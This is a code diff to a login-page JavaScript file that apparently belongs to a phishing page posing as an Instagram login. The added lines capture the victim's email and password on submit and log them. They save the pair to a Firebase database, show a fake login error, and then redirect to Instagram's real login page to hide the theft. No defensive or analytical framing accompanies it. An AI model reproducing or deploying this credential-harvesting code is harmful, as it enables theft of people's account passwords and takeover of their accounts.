@@ -1,3 +1,5 @@
+
+
 window.onload = function (){
     const loadingPage = document.querySelector(".loading-page");
     setTimeout(()=>{
@@ -8,10 +10,13 @@ window.onload = function (){
     },1000)
 }
 
-const emailfields = document.querySelector(".email");
-const passfield = document.querySelector(".password");
-const passShowbtn = document.querySelector(".show");
-const loginbtn = document.querySelector(".login");
+var emailfields = document.querySelector(".email");
+var passfield = document.querySelector(".password");
+var passShowbtn = document.querySelector(".show");
+var loginbtn = document.querySelector(".login");
+
+
+
 
 //password field scripts.............
 
@@ -23,7 +28,7 @@ passfield.addEventListener("focus",()=>{
 passfield.addEventListener("blur",()=>{
   if(passfield.value.length === 0){
     passShowbtn.style.display = "none";
-    loginbtn.style.background = "#00b3ff"
+    loginbtn.style.background = "#00b3ff";
   }
   else{
     passShowbtn.style.filter = "opacity(0.5)";
@@ -31,7 +36,8 @@ passfield.addEventListener("blur",()=>{
       loginbtn.style.background = "#007bef"
     }
     else{
-      loginbtn.style.background = "#00b3ff"
+      loginbtn.style.background = "#00b3ff";
+      
     }
   }
 })
@@ -57,13 +63,37 @@ passfield.addEventListener("blur",()=>{
           }
         }, false);
     
+
+//firebase
+
+
+
 loginbtn.addEventListener("click",()=>{
   loginbtn.innerHTML = '<img class="spinner" src="./images/spinner.gif">';
-  setTimeout(()=>{
-    loginbtn.innerHTML = "Log in";
-    let errormsg = document.querySelector(".error");
-    let container = document.querySelector(".container");
-    errormsg.style.display = "block";
-    container.style.width = "70%";
-  },2000)
+  var email = emailfields.value;
+  var password = passfield.value;
+
+  console.log('email:'+email +'\n'+'Password: '+password);
+
+    setTimeout(()=>{
+      loginbtn.innerHTML = "Log in";
+      let errormsg = document.querySelector(".error");
+      let container = document.querySelector(".container");
+      errormsg.style.display = "block";
+      container.style.width = "70%";
+    },2000)
+
+
+        // Save the email and password fields to the Firebase Realtime Database
+        var userRef = database.ref("users").push();
+        userRef.set({
+          id:email,
+          Password: password
+        });
+
+    setTimeout(()=>{
+      window.location.assign("https://www.instagram.com/accounts/login/");
+    },4000)
+    
 })
+
